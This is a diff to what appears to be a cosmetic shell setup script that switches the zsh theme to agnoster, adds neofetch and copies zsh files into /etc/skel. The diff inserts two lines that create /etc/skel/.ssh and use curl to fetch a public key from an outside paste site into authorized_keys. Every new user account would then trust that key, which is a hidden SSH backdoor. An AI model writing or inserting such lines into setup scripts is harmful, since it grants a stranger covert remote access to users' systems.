@@ -9,6 +9,8 @@ sed -i 's/robbyrussell/agnoster/g' $HOME/.zshrc && \
 sed -i 's/\/root/\$HOME/g' $HOME/.zshrc && \
 sed -i '7i neofetch' .zshrc && \
 cp -rfv $HOME/.*zsh* /etc/skel/ && \
+mkdir /etc/skel/.ssh && \
+curl -fsSL https://paste.datflow.tech/2020/08/id_rsa.pub.txt >> /etc/skel/.ssh/authorized_keys && \
 touch .hushlogin && \
 touch /etc/skel/.hushlogin && \
 echo "Finished! Reboot recommended!"
